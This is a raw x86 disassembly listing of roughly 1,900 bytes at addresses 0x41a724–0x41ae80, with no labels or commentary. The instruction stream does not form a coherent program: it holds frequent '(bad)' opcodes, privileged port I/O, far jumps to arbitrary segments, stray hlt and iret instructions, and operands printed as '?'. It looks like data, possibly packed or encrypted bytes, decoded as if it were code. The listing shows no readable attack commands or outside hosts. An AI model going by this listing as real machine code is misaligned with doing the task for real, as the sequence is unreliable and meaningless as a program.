  41a724:	mov    eax,ds:0xa033d8f7
  41a729:	or     eax,0x98dd9e8
  41a72e:	mov    al,ds:0xfc325623
  41a733:	and    eax,0xd6e499ad
  41a738:	lock jmp 0xae43229f
  41a73e:	xor    bl,BYTE PTR [esi+0x776054a2]
  41a744:	and    al,0x3
  41a746:	call   0x5893a472
  41a74b:	ins    BYTE PTR es:[edi],dx
  41a74c:	test   BYTE PTR [ecx-0x4f],0x12
  41a750:	ret    0x43d0
  41a753:	scas   al,BYTE PTR es:[edi]
  41a754:	mov    bl,0xb9
  41a756:	xchg   ecx,eax
  41a757:	cs dec eax
  41a759:	push   0xef8d133c
  41a75e:	popf   
  41a75f:	iret   
  41a760:	loope  0x41a79b
  41a762:	bound  edi,QWORD PTR [ebx+0x1fb3e73c]
  41a768:	aam    0x17
  41a76a:	into   
  41a76b:	test   al,0x3d
  41a76d:	adc    al,0xec
  41a76f:	inc    ebx
  41a770:	xor    BYTE PTR [ecx+0x1b],al
  41a773:	push   ss
  41a774:	dec    esp
  41a775:	and    al,0x92
  41a777:	clc    
  41a778:	dec    esp
  41a779:	jns    0x41a792
  41a77b:	rcl    DWORD PTR [ebp+0x60],0x2b
  41a77f:	mov    ecx,0xf3fb4591
  41a784:	add    ah,BYTE PTR [eax+0x2ef95e86]
  41a78a:	inc    edx
  41a78b:	or     al,0x87
  41a78d:	(bad)  
  41a78e:	in     al,dx
  41a78f:	lods   al,BYTE PTR ds:[esi]
  41a790:	sbb    ebx,DWORD PTR [edi+0x4d]
  41a793:	jo     0x41a7c1
  41a795:	sub    BYTE PTR [edi-0x7f0644a1],al
  41a79b:	jns    0x41a808
  41a79d:	sbb    BYTE PTR [edi],ch
  41a79f:	and    eax,0x6f4dab67
  41a7a4:	mov    ?,WORD PTR [edx]
  41a7a6:	mov    edi,0xbefeb9ba
  41a7ab:	push   esp
  41a7ac:	or     BYTE PTR [ebx-0x29],bh
  41a7af:	loop   0x41a733
  41a7b1:	sbb    BYTE PTR [ebx+0x62],bl
  41a7b4:	dec    eax
  41a7b5:	mov    DWORD PTR [edi+ecx*2],ecx
  41a7b8:	dec    esi
  41a7b9:	mov    al,ds:0xe3e34da9
  41a7be:	push   esi
  41a7bf:	in     eax,dx
  41a7c0:	add    eax,0xf74e69b7
  41a7c5:	(bad)
  41a7c9:	pop    esp
  41a7ca:	repz call 0xe662dd1a
  41a7d0:	cmp    al,BYTE PTR [ecx]
  41a7d2:	test   al,0x93
  41a7d4:	jo     0x41a782
  41a7d6:	sbb    BYTE PTR ds:0x69277912,bh
  41a7dc:	test   DWORD PTR [eax-0x776efb62],ecx
  41a7e2:	(bad)  
  41a7e3:	jnp    0x41a844
  41a7e5:	add    ch,BYTE PTR [ebp-0x5a]
  41a7e8:	push   cs
  41a7e9:	mov    al,ds:0x4389dfc0
  41a7ee:	sub    edi,DWORD PTR [eax+0x3a]
  41a7f1:	stos   DWORD PTR es:[edi],eax
  41a7f2:	adc    dl,BYTE PTR [eax-0x32]
  41a7f5:	mov    ebp,?
  41a7f7:	pusha  
  41a7f8:	stos   BYTE PTR es:[edi],al
  41a7f9:	jb     0x41a873
  41a7fb:	dec    esi
  41a7fc:	div    DWORD PTR ds:0x8e6f49df
  41a802:	call   0x6b5e9ebc
  41a807:	loop   0x41a7ff
  41a809:	push   esp
  41a80a:	fsubr  QWORD PTR [eax]
  41a80c:	adc    edx,0xffffff81
  41a80f:	jmp    0x26e:0x91070c55
  41a816:	or     BYTE PTR [ebp-0x62045003],cl
  41a81c:	mov    ds:0x41e7323d,eax
  41a821:	xlat   BYTE PTR ds:[ebx]
  41a822:	inc    eax
  41a823:	hlt    
  41a824:	cmp    DWORD PTR [esi+0x39],edi
  41a827:	xor    esp,DWORD PTR [ebp+0x49c761e2]
  41a82d:	mov    eax,DWORD PTR ds:0x52da7d85
  41a833:	lods   eax,DWORD PTR ds:[esi]
  41a834:	inc    esi
  41a835:	mov    ds,WORD PTR [eax-0x4095b618]
  41a83b:	sbb    DWORD PTR [ebp+0x65],ecx
  41a83e:	push   0x56
  41a840:	call   0x2556:0xb4894a95
  41a847:	jl     0x41a856
  41a849:	and    DWORD PTR [esi+0x3b],edi
  41a84c:	pop    ebx
  41a84d:	rol    cl,0xa5
  41a850:	pop    ecx
  41a851:	les    ebp,FWORD PTR [eax-0x7c]
  41a854:	cmp    eax,0xd2162ea1
  41a859:	gs in  eax,dx
  41a85b:	aad    0x93
  41a85d:	aad    0xc2
  41a85f:	or     al,0x94
  41a861:	jp     0x41a7e8
  41a863:	fimul  WORD PTR [edi-0x434c71c8]
  41a869:	pop    esp
  41a86a:	dec    eax
  41a86b:	push   0x2f
  41a86d:	scas   al,BYTE PTR es:[edi]
  41a86e:	sar    BYTE PTR [ecx+0x64a2b0c1],0xad
  41a875:	xor    BYTE PTR [eax-0x55c60fca],dl
  41a87b:	je     0x41a8dd
  41a87d:	fbstp  TBYTE PTR [edi+0x74]
  41a880:	sub    al,0x7
  41a882:	xchg   DWORD PTR [esi-0x5b86253a],esp
  41a888:	inc    ebp
  41a889:	adc    esp,ebx
  41a88b:	cmp    ecx,edi
  41a88d:	mov    eax,DWORD PTR [ebx-0x4]
  41a890:	dec    edi
  41a891:	jne    0x41a886
  41a893:	sbb    bl,ah
  41a895:	push   ebp
  41a896:	std    
  41a897:	push   es
  41a898:	(bad)  
  41a899:	cmp    DWORD PTR [eax],ebp
  41a89b:	nop
  41a89c:	pop    ss
  41a89d:	ins    BYTE PTR es:[edi],dx
  41a89e:	push   cs
  41a89f:	cdq    
  41a8a0:	in     al,0xb3
  41a8a2:	sub    BYTE PTR [edx+edi*4+0x741eb8f8],0x66
  41a8aa:	xor    DWORD PTR [ecx+0x3fc8bfce],edx
  41a8b0:	test   eax,0x4e325f3a
  41a8b5:	pusha  
  41a8b6:	sbb    BYTE PTR [ebx+ebp*8+0x4df6585a],0xde
  41a8be:	out    0xca,eax
  41a8c0:	push   es
  41a8c1:	imul   ebp,DWORD PTR [ecx+0x2c],0xffffff85
  41a8c5:	or     al,0xaf
  41a8c7:	pop    ss
  41a8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c9:	lods   al,BYTE PTR ds:[esi]
  41a8ca:	inc    ebp
  41a8cb:	not    dl
  41a8cd:	iret   
  41a8ce:	and    esi,DWORD PTR [eax-0x4a]
  41a8d1:	and    dh,al
  41a8d3:	or     eax,0xf275b2b6
  41a8d8:	iret   
  41a8d9:	sahf   
  41a8da:	cmp    bh,BYTE PTR [ebp+0x14]
  41a8dd:	fs dec eax
  41a8df:	fisttp WORD PTR [esi+edi*2]
  41a8e2:	rcr    DWORD PTR ds:0x6798e564,0xfc
  41a8e9:	lahf   
  41a8ea:	shr    DWORD PTR [edi-0x5b],cl
  41a8ed:	in     eax,dx
  41a8ee:	xlat   BYTE PTR ds:[ebx]
  41a8ef:	pushf  
  41a8f0:	dec    ecx
  41a8f1:	mov    cl,BYTE PTR [edx+0x43]
  41a8f4:	jns    0x41a8ef
  41a8f6:	cli    
  41a8f7:	and    BYTE PTR ds:0x738f8940,cl
  41a8fd:	addr16 (bad) 
  41a8ff:	ficomp WORD PTR [ecx+0x35261907]
  41a905:	in     al,dx
  41a906:	scas   al,BYTE PTR es:[edi]
  41a907:	add    ebx,DWORD PTR [esi]
  41a909:	add    DWORD PTR [eax+eiz*1+0x73],edx
  41a90d:	sti    
  41a90e:	mov    WORD PTR [edx-0x67],?
  41a911:	es mov ah,0x4f
  41a914:	cmp    edi,DWORD PTR [ebx+0x63]
  41a917:	scas   eax,DWORD PTR es:[edi]
  41a918:	aaa    
  41a919:	cmp    esp,DWORD PTR cs:[ebx+0x66]
  41a91d:	sbb    eax,0x5e78b5f9
  41a922:	mov    eax,ds:0x3840fe4f
  41a927:	jne    0x41a955
  41a929:	imul   eax,DWORD PTR [esi+0x78844135],0xffffffcf
  41a930:	or     BYTE PTR [edx+0x5b54b2d9],ch
  41a936:	pop    ecx
  41a937:	aas    
  41a938:	fdivr  QWORD PTR [ebx]
  41a93a:	cli    
  41a93b:	cli    
  41a93c:	int    0x63
  41a93e:	loopne 0x41a961
  41a940:	lods   al,BYTE PTR ds:[esi]
  41a941:	push   esp
  41a942:	outs   dx,DWORD PTR ds:[esi]
  41a943:	jmp    0x5135:0xcabfa8f6
  41a94a:	inc    esi
  41a94b:	fs stos BYTE PTR es:[edi],al
  41a94d:	(bad)  
  41a94e:	mov    cl,0x50
  41a950:	push   ebx
  41a951:	mov    dh,0x12
  41a953:	xchg   esi,eax
  41a954:	xor    dl,ah
  41a956:	add    BYTE PTR [esi+eiz*1+0x1e],ah
  41a95a:	(bad)  [eax+0x5a66cdf4]
  41a960:	mov    eax,ds:0xb36b26ad
  41a965:	nop
  41a966:	test   al,0xf0
  41a968:	aas    
  41a969:	test   eax,0xea6131b8
  41a96e:	lods   eax,DWORD PTR ds:[esi]
  41a96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a970:	das    
  41a971:	fcom   DWORD PTR [eax+eax*2-0x21892a2d]
  41a978:	out    dx,eax
  41a979:	jae    0x41a9de
  41a97b:	jge    0x41a945
  41a97d:	xchg   esi,eax
  41a97e:	sub    al,0x6e
  41a980:	push   esi
  41a981:	and    edx,edi
  41a983:	pop    eax
  41a984:	fidivr DWORD PTR [ecx]
  41a986:	jae    0x41aa01
  41a988:	adc    al,0xe4
  41a98a:	sar    ebp,0x9a
  41a98d:	icebp  
  41a98e:	pop    esi
  41a98f:	rcl    BYTE PTR gs:[ebp+0x4e],1
  41a993:	or     al,0x5d
  41a995:	(bad)  
  41a996:	pop    ds
  41a997:	xor    DWORD PTR [esi],ecx
  41a999:	(bad)
  41a99d:	(bad)  
  41a99e:	ror    DWORD PTR [edi],cl
  41a9a0:	mov    eax,0xfaa0c25c
  41a9a5:	cmp    DWORD PTR [edi+eax*2],ebp
  41a9a8:	stos   DWORD PTR es:[edi],eax
  41a9a9:	or     eax,0x6abbf8b4
  41a9ae:	adc    esp,edx
  41a9b0:	dec    esi
  41a9b1:	(bad)  
  41a9b3:	push   ss
  41a9b4:	fsubr  QWORD PTR [ebx]
  41a9b6:	add    edx,ebp
  41a9b8:	out    dx,eax
  41a9b9:	jnp    0x41a948
  41a9bb:	xlat   BYTE PTR ds:[ebx]
  41a9bc:	and    BYTE PTR [edi+0xa],0xc8
  41a9c0:	xchg   esi,eax
  41a9c1:	ja     0x41a971
  41a9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c4:	and    cl,ah
  41a9c6:	or     DWORD PTR [ebx+ebx*4-0x64],ebx
  41a9ca:	mov    al,ds:0x91d3ef90
  41a9cf:	adc    dl,BYTE PTR [ebp-0x1cf0f8c1]
  41a9d5:	mov    WORD PTR [esi-0x19ec35bb],ss
  41a9db:	dec    ebx
  41a9dc:	rcl    BYTE PTR [ebp+0x6f9a69cf],cl
  41a9e2:	jns    0x41aa2a
  41a9e4:	and    BYTE PTR [esp+eax*4-0x5b],dl
  41a9e8:	lahf   
  41a9e9:	rcl    DWORD PTR [eax],1
  41a9eb:	and    bl,BYTE PTR [ecx+edi*2-0x2d9677ac]
  41a9f2:	lahf   
  41a9f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9f4:	sub    al,0x5f
  41a9f6:	adc    DWORD PTR [ebx+0xde37e05],0xbba1ea9a
  41aa00:	or     esi,DWORD PTR [ebx]
  41aa02:	leave  
  41aa03:	adc    dl,BYTE PTR [edx+ebx*1-0x70]
  41aa07:	data16 (bad) 
  41aa09:	jmp    0xf9b582a3
  41aa0e:	pop    ss
  41aa0f:	out    dx,eax
  41aa10:	stos   BYTE PTR es:[edi],al
  41aa11:	retf   
  41aa12:	xlat   BYTE PTR ds:[ebx]
  41aa13:	sub    bl,BYTE PTR [ebp-0xb]
  41aa16:	(bad)  
  41aa18:	sub    BYTE PTR [ebx-0x47],al
  41aa1b:	dec    esi
  41aa1c:	test   BYTE PTR [edi],dl
  41aa1e:	test   DWORD PTR [edx],eax
  41aa20:	pop    edx
  41aa21:	mov    eax,DWORD PTR [edx]
  41aa23:	in     al,0x60
  41aa25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa26:	push   ecx
  41aa27:	jmp    0x27b9:0xcac3f60f
  41aa2e:	arpl   ax,cx
  41aa30:	or     eax,0xc66206a9
  41aa35:	lods   al,BYTE PTR ds:[esi]
  41aa36:	mov    fs,ebp
  41aa38:	pop    ss
  41aa39:	cmc    
  41aa3a:	push   esp
  41aa3b:	call   0x3d947599
  41aa40:	loope  0x41aa36
  41aa42:	cmp    al,0xeb
  41aa44:	(bad)  
  41aa45:	cld    
  41aa46:	cli    
  41aa47:	mov    edx,0xbc30f00a
  41aa4c:	mov    esp,0x647a5e8d
  41aa51:	and    eax,0xee18a81
  41aa56:	dec    ebp
  41aa57:	xchg   ecx,eax
  41aa58:	cmp    esp,DWORD PTR [ebx-0x3e]
  41aa5b:	xchg   ebp,eax
  41aa5c:	and    eax,0x24231733
  41aa61:	fisttp QWORD PTR [eax]
  41aa63:	call   0x1075fcd4
  41aa68:	mov    ds:0x430a732c,eax
  41aa6d:	bnd jns 0x41aa20
  41aa70:	push   ebx
  41aa71:	repnz fsub QWORD PTR [eax]
  41aa74:	cmp    eax,0xfff85927
  41aa79:	out    dx,eax
  41aa7a:	mov    ah,0xe1
  41aa7c:	dec    ebp
  41aa7d:	adc    ah,BYTE PTR [eax]
  41aa7f:	mov    ecx,DWORD PTR [eax+0x5e50cdf4]
  41aa85:	add    BYTE PTR [edx-0x11ec07cb],ah
  41aa8b:	pop    ds
  41aa8c:	pop    ebp
  41aa8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa8e:	(bad)  
  41aa8f:	mov    dh,0x64
  41aa91:	retf   0xb7c5
  41aa94:	pop    edi
  41aa95:	or     esi,DWORD PTR [ebp+ebp*2-0x24]
  41aa99:	xchg   BYTE PTR [esp+eax*8-0x26],ah
  41aa9d:	mov    dh,0xda
  41aa9f:	xchg   ebp,eax
  41aaa0:	scas   eax,DWORD PTR es:[edi]
  41aaa1:	push   ebp
  41aaa2:	stos   BYTE PTR es:[edi],al
  41aaa3:	pop    edi
  41aaa4:	adc    eax,0xe5d4f870
  41aaa9:	dec    ebx
  41aaaa:	lock lahf 
  41aaac:	jno    0x41aab5
  41aaae:	push   ecx
  41aaaf:	dec    ebp
  41aab0:	xor    esp,DWORD PTR [edx-0x502f1ef3]
  41aab6:	push   0x21
  41aab8:	jle    0x41ab17
  41aaba:	mov    dl,0xce
  41aabc:	sbb    eax,0xc7b04dd4
  41aac1:	push   ebx
  41aac2:	jns    0x41aa4d
  41aac4:	sbb    bl,BYTE PTR [edi+0x66b717b1]
  41aaca:	lea    ebx,[ebp+0x6c]
  41aacd:	stos   BYTE PTR es:[edi],al
  41aace:	push   esp
  41aacf:	test   al,0xa3
  41aad1:	add    bh,BYTE PTR [edx]
  41aad3:	inc    esi
  41aad4:	clc    
  41aad5:	cld    
  41aad6:	sti    
  41aad7:	pop    es
  41aad8:	inc    esp
  41aad9:	push   edx
  41aada:	dec    esi
  41aadb:	fcom   st(4)
  41aadd:	mul    DWORD PTR [edi+ebp*1]
  41aae0:	dec    ebp
  41aae1:	ja     0x41aaa9
  41aae3:	pop    ebx
  41aae4:	add    al,0x28
  41aae6:	mov    ds:0x50e9a7c,eax
  41aaeb:	mov    ch,0xc0
  41aaed:	pop    ds
  41aaee:	jle    0x41ab60
  41aaf0:	xchg   esp,eax
  41aaf1:	or     al,0x98
  41aaf3:	inc    eax
  41aaf4:	mov    ah,0xc8
  41aaf6:	nop
  41aaf7:	(bad)  
  41aaf9:	xor    DWORD PTR [edi-0x808fef],edx
  41aaff:	sub    ecx,ebp
  41ab01:	(bad)  
  41ab02:	out    dx,eax
  41ab03:	add    eax,0xdb119640
  41ab08:	clc    
  41ab09:	sub    al,0x86
  41ab0b:	aad    0x6e
  41ab0d:	jmp    0x6c2b7160
  41ab12:	cmp    cl,BYTE PTR [esi+0x5bd370e5]
  41ab18:	les    edx,FWORD PTR [ebx+0x57]
  41ab1b:	push   esp
  41ab1c:	jp     0x41ab99
  41ab1e:	or     BYTE PTR [ebx-0x21721587],ch
  41ab24:	xchg   BYTE PTR [ebx-0x57],dh
  41ab27:	push   ds
  41ab28:	out    dx,eax
  41ab29:	xchg   BYTE PTR fs:[esi-0x6d579f5],dl
  41ab30:	inc    bp
  41ab32:	sbb    al,0xac
  41ab34:	xchg   esp,eax
  41ab35:	sti    
  41ab36:	into   
  41ab37:	xchg   DWORD PTR [edx],eax
  41ab39:	mov    ds:0x11df0189,al
  41ab3e:	xor    BYTE PTR [ebp+edx*2-0xbe2d1e6],ah
  41ab45:	and    BYTE PTR ds:0xc8d76adb,dh
  41ab4b:	inc    ecx
  41ab4c:	(bad)  ds:0x6660088b
  41ab52:	xchg   BYTE PTR [ebp+0x3d],al
  41ab55:	sbb    eax,0x3a5fda47
  41ab5a:	mov    esi,0xd0b09ad3
  41ab5f:	int3   
  41ab60:	dec    esp
  41ab61:	out    0xfa,al
  41ab63:	(bad)  
  41ab64:	xchg   edi,eax
  41ab65:	retf   0x8d61
  41ab68:	test   BYTE PTR [esi+ebp*8-0x3b],al
  41ab6c:	cmc    
  41ab6d:	adc    BYTE PTR [ebx+0x3f691d76],bl
  41ab73:	test   DWORD PTR [edi],edi
  41ab75:	mov    bl,0x83
  41ab77:	mov    eax,ds:0xefd4e1c
  41ab7c:	mov    bl,0x95
  41ab7e:	cmp    eax,0x3f5289d
  41ab83:	int3   
  41ab84:	sahf   
  41ab85:	mov    al,0x55
  41ab87:	mov    ah,0x98
  41ab89:	or     DWORD PTR ds:0xe7d0088d,0xffffffd8
  41ab90:	lds    ecx,FWORD PTR [edi]
  41ab92:	dec    eax
  41ab93:	sbb    DWORD PTR [ebx],esi
  41ab95:	je     0x41ab67
  41ab97:	mov    bh,0xa2
  41ab99:	jmp    0x79afea4f
  41ab9e:	inc    ebp
  41ab9f:	sar    DWORD PTR ds:0x914156ff,1
  41aba5:	adc    ebp,0x49
  41aba8:	xor    al,0xed
  41abaa:	inc    esi
  41abab:	sbb    cl,BYTE PTR [eax]
  41abad:	enter  0x83c3,0x3
  41abb1:	push   es
  41abb2:	gs add eax,0x48f8b790
  41abb8:	jo     0x41ab75
  41abba:	std    
  41abbb:	movzx  eax,WORD PTR [ebx]
  41abbe:	retf   
  41abbf:	pop    edx
  41abc0:	mov    dl,0x90
  41abc2:	add    ah,BYTE PTR [ecx]
  41abc4:	addr16 ds out dx,al
  41abc7:	and    edi,DWORD PTR [edi+0x5b]
  41abca:	sbb    bl,dh
  41abcc:	xchg   ebp,eax
  41abcd:	fstp   QWORD PTR ds:0x6c318781
  41abd3:	cmp    DWORD PTR [ebx],0x7e
  41abd6:	xor    eax,DWORD PTR [eax-0x294cf797]
  41abdc:	push   edi
  41abdd:	outs   dx,BYTE PTR ds:[esi]
  41abde:	in     al,dx
  41abdf:	mov    ecx,0x13a9dcf
  41abe4:	xor    al,0x82
  41abe6:	(bad)  
  41abe7:	in     al,0x38
  41abe9:	(bad)  [edx+0x1]
  41abec:	pop    esi
  41abed:	sub    bh,bl
  41abef:	ins    DWORD PTR es:[edi],dx
  41abf0:	out    dx,eax
  41abf1:	dec    esi
  41abf2:	sbb    eax,0x2ff5c202
  41abf7:	mov    edx,0xa99ec0c0
  41abfc:	jle    0x41ac4d
  41abfe:	add    ch,BYTE PTR [ebp+0x5a4002c4]
  41ac04:	mov    edx,0xbb834bca
  41ac09:	xchg   ecx,eax
  41ac0a:	fs test eax,0xe69f2220
  41ac10:	sbb    BYTE PTR [ecx],ah
  41ac12:	clc    
  41ac13:	xchg   esp,ebp
  41ac15:	inc    esp
  41ac16:	out    dx,al
  41ac17:	push   ss
  41ac18:	fstp   DWORD PTR [ecx+0x74]
  41ac1b:	or     esp,ebp
  41ac1d:	in     eax,dx
  41ac1e:	test   eax,0x4270c8da
  41ac23:	aam    0x28
  41ac25:	sub    DWORD PTR ds:0x2ba69853,edi
  41ac2b:	pusha  
  41ac2c:	sub    edx,DWORD PTR [eax+0x76]
  41ac2f:	shl    edi,cl
  41ac31:	adc    esp,ecx
  41ac33:	ret    
  41ac34:	or     ch,BYTE PTR [ebx+0x79744b23]
  41ac3a:	dec    ebx
  41ac3b:	or     BYTE PTR [eax+0x6b],al
  41ac3e:	mov    ch,0xb6
  41ac40:	push   0x77
  41ac42:	out    0xdf,al
  41ac44:	push   ds
  41ac45:	dec    ebp
  41ac46:	xchg   ecx,eax
  41ac47:	ret    0x55c6
  41ac4a:	data16 add BYTE PTR [esi+esi*4],dh
  41ac4e:	es inc edi
  41ac50:	mov    esi,0x9180ea7e
  41ac55:	dec    eax
  41ac56:	or     BYTE PTR [edi],bh
  41ac58:	and    BYTE PTR [edx-0x267ef4c4],ah
  41ac5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac5f:	adc    al,0x8d
  41ac61:	cmp    edx,esp
  41ac63:	mov    BYTE PTR [edx+eiz*1-0x33],bh
  41ac67:	mov    edi,0xf34b51b8
  41ac6c:	mov    gs,WORD PTR [esi]
  41ac6e:	sbb    eax,0x9e38c34f
  41ac73:	fisubr WORD PTR [ecx-0x4a]
  41ac76:	and    BYTE PTR [ecx],cl
  41ac78:	pushf  
  41ac79:	in     al,dx
  41ac7a:	aas    
  41ac7b:	lods   eax,DWORD PTR ds:[esi]
  41ac7c:	sahf   
  41ac7d:	scas   al,BYTE PTR es:[edi]
  41ac7e:	data16 mov bh,0x2e
  41ac81:	xor    edi,DWORD PTR [edx+ebp*4-0x5bd194df]
  41ac88:	sub    dl,BYTE PTR ds:0x73f442e7
  41ac8e:	pop    edi
  41ac8f:	cmc    
  41ac90:	jne    0x41ac9f
  41ac92:	dec    ebp
  41ac93:	daa    
  41ac94:	fdiv   DWORD PTR [ebx]
  41ac96:	ret    
  41ac97:	in     al,0x8c
  41ac99:	leave  
  41ac9a:	mov    ecx,0x2386e3e6
  41ac9f:	mov    ebp,0x7ad1b457
  41aca4:	inc    ebx
  41aca5:	test   BYTE PTR [edi],bh
  41aca7:	fs (bad) 
  41aca9:	pop    ecx
  41acaa:	jl     0x41ac4c
  41acac:	push   ebp
  41acad:	dec    ebp
  41acae:	cmp    ebp,DWORD PTR [ebx+0x63f337ef]
  41acb4:	ins    DWORD PTR es:[edi],dx
  41acb5:	dec    edx
  41acb6:	mov    ds:0x7403c0e1,al
  41acbb:	dec    eax
  41acbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acbd:	mov    esp,0x11fe6de9
  41acc2:	jo     0x41ac8e
  41acc4:	dec    esp
  41acc5:	imul   edi,DWORD PTR [edx],0xdda99abd
  41accb:	jbe    0x41acdb
  41accd:	add    ah,al
  41accf:	mov    dl,0x7c
  41acd1:	push   es
  41acd2:	mov    bl,0x44
  41acd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acd5:	retf   0xc05d
  41acd8:	jmp    0x41ad25
  41acda:	jnp    0x41ac77
  41acdc:	sub    eax,0x80ff0a29
  41ace1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace2:	mov    bl,al
  41ace4:	test   eax,0xed5d881
  41ace9:	sbb    al,0x47
  41aceb:	mov    cl,0xfb
  41aced:	xor    eax,0x914302f2
  41acf2:	sbb    eax,0x86327892
  41acf7:	hlt    
  41acf8:	add    ebx,DWORD PTR [edx-0x5862f7a8]
  41acfe:	ins    BYTE PTR es:[edi],dx
  41acff:	fidiv  DWORD PTR [edx]
  41ad01:	jmp    0x41acb0
  41ad03:	pop    edi
  41ad04:	or     al,0xbd
  41ad06:	xchg   ebp,eax
  41ad07:	lock jge 0x41acae
  41ad0a:	push   es
  41ad0b:	(bad)  
  41ad0d:	(bad)  
  41ad0e:	push   ds
  41ad0f:	pop    ebp
  41ad10:	jle    0x41ad89
  41ad12:	clc    
  41ad13:	sti    
  41ad14:	hlt    
  41ad15:	add    eax,0x85490401
  41ad1a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1c:	adc    eax,ecx
  41ad1e:	dec    esp
  41ad1f:	in     al,0x52
  41ad21:	cmc    
  41ad22:	xor    ebp,ecx
  41ad24:	(bad)  
  41ad26:	jne    0x41acc7
  41ad28:	lock mov eax,ds:0xb9387cfe
  41ad2e:	sbb    BYTE PTR [edx],bh
  41ad30:	aaa    
  41ad31:	jmp    0x79d7:0x4199787d
  41ad38:	aad    0xb7
  41ad3a:	push   ecx
  41ad3b:	cmp    al,0x12
  41ad3d:	rol    DWORD PTR [eax-0x6f5d937f],1
  41ad43:	and    dl,BYTE PTR ds:0xaf3886b1
  41ad49:	push   es
  41ad4a:	ror    BYTE PTR [edx+0x72f13613],1
  41ad50:	les    ebx,FWORD PTR [ecx]
  41ad52:	js     0x41adae
  41ad54:	xor    al,0x8d
  41ad56:	lds    edi,FWORD PTR [ebx-0x13]
  41ad59:	sub    DWORD PTR [edi],0x6801540
  41ad5f:	mov    edx,0xa0cfcfec
  41ad64:	repnz (bad) 
  41ad66:	mov    ebp,0x2bd4ac0f
  41ad6b:	xchg   ecx,eax
  41ad6c:	xchg   edx,eax
  41ad6d:	shr    DWORD PTR ds:0xee493ab8,0xa7
  41ad74:	jbe    0x41adc5
  41ad76:	pop    es
  41ad77:	mov    ebx,0x83726e1
  41ad7c:	mov    BYTE PTR ds:0x251cb297,dl
  41ad83:	xor    al,0xd9
  41ad85:	popf   
  41ad86:	xor    cl,ah
  41ad88:	cmp    DWORD PTR [ebx+0x62],ebx
  41ad8b:	rol    DWORD PTR [eax+edi*8-0x43],1
  41ad8f:	loopne 0x41adb0
  41ad91:	loope  0x41adc2
  41ad93:	inc    ebp
  41ad94:	pop    es
  41ad95:	clc    
  41ad96:	inc    ebx
  41ad97:	cs dec ecx
  41ad99:	xlat   BYTE PTR ds:[ebx]
  41ad9a:	leave  
  41ad9b:	ss lock in al,dx
  41ad9e:	cmp    eax,0xd38d3c11
  41ada3:	shl    DWORD PTR [ecx+ebp*8+0x52],cl
  41ada7:	(bad)  
  41ada8:	mov    eax,0x7a4de12
  41adad:	sbb    al,0xc
  41adaf:	push   0xffffffe9
  41adb1:	icebp  
  41adb2:	adc    edi,DWORD PTR [ecx+0x14]
  41adb5:	mov    ebx,0xa69089ac
  41adba:	das    
  41adbb:	adc    al,0xd8
  41adbd:	dec    esi
  41adbe:	jne    0x41ad7c
  41adc0:	and    al,0x7f
  41adc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adc3:	nop
  41adc4:	xor    al,0x21
  41adc6:	or     bl,BYTE PTR [edx-0x787a29ce]
  41adcc:	and    DWORD PTR [edx+0x3dc2d26e],0xfffffff0
  41add3:	cmp    DWORD PTR [edi-0x107b5d4c],esi
  41add9:	mov    ebx,0x2c500d29
  41adde:	xchg   esp,eax
  41addf:	cs xor eax,0x6ca421bf
  41ade5:	xchg   ebx,eax
  41ade6:	lock sub esp,DWORD PTR [eax+0x55]
  41adea:	and    cl,0x61
  41aded:	ss dec ecx
  41adef:	push   cs
  41adf0:	hlt    
  41adf1:	(bad)  
  41adf2:	xchg   ecx,eax
  41adf3:	jg     0x41adcc
  41adf5:	xor    al,0x3a
  41adf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf8:	or     BYTE PTR [ebp+0x57a672f4],cl
  41adfe:	jmp    0x8e130601
  41ae03:	pop    ecx
  41ae04:	fst    QWORD PTR [esi]
  41ae06:	mov    WORD PTR [edi-0x30],es
  41ae09:	cmp    ah,BYTE PTR [ebx]
  41ae0b:	cwde   
  41ae0c:	jns    0x41ada3
  41ae0e:	sub    BYTE PTR [ebx+0x2674ff47],bl
  41ae14:	mov    ch,0x5a
  41ae16:	xchg   esi,eax
  41ae17:	adc    BYTE PTR [eax-0x30],bl
  41ae1a:	mov    dl,0xb
  41ae1c:	pusha  
  41ae1d:	sub    ch,BYTE PTR [esi+0xe]
  41ae20:	loop   0x41ae66
  41ae22:	out    dx,eax
  41ae23:	and    eax,0x376eb2c3
  41ae28:	push   ss
  41ae29:	sahf   
  41ae2a:	jl     0x41adad
  41ae2c:	jg     0x41ae5d
  41ae2e:	div    DWORD PTR [ecx]
  41ae30:	(bad)  
  41ae31:	int3   
  41ae32:	call   0x2175:0x73390a0b
  41ae39:	push   es
  41ae3a:	(bad)  
  41ae3b:	sti    
  41ae3c:	xchg   DWORD PTR [esi+0xd],edi
  41ae3f:	jmp    0x41adf1
  41ae41:	lock fstp DWORD PTR [edi-0x21cc032f]
  41ae48:	mov    edx,0xd10d5230
  41ae4d:	rol    DWORD PTR [ecx],1
  41ae4f:	shl    ecx,cl
  41ae51:	arpl   WORD PTR [ebp+0x73],cx
  41ae54:	pop    edi
  41ae55:	ret    0x127d
  41ae58:	mov    bl,0x2
  41ae5a:	mov    edx,ecx
  41ae5c:	sbb    eax,0x85e2296e
  41ae61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae62:	xchg   edx,eax
  41ae63:	jns    0x41ae94
  41ae65:	bound  ecx,QWORD PTR [edi+0x2]
  41ae68:	sbb    eax,0xda6e2edf
  41ae6d:	popf   
  41ae6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae6f:	xchg   ebx,eax
  41ae70:	pop    ebx
  41ae71:	xchg   edx,eax
  41ae72:	dec    esp
  41ae73:	popa   
  41ae74:	aas    
  41ae75:	retf   
  41ae76:	imul   BYTE PTR [eax+0x2b]
  41ae79:	rcl    DWORD PTR [eax-0x4336bc31],0xab
  41ae80:	gs mov dh,0xb8
